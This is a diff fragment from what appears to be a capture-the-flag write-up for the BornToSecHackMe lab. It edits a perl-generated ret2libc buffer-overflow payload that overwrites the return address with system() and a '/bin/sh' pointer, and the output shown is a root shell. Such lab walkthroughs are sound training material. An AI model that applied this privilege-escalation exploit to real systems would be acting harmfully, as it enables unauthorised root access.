@@ -646,7 +646,7 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 0xb7f8cc58
 ```
 ```shell
-zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . "AAAA" . pack("V", 0xb7f8cc58)'`
+zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���AAAAX���
 # id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
